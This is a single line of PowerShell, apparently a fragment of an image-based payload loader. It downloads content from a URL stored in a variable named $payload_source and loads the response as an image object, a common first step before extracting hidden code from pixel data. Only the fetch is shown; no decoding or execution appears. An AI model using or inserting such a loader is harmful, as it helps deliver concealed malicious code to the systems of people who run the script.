[System.Drawing.Image]::FromStream((Invoke-WebRequest -Uri $payload_source).RawContentStream, $true, $true)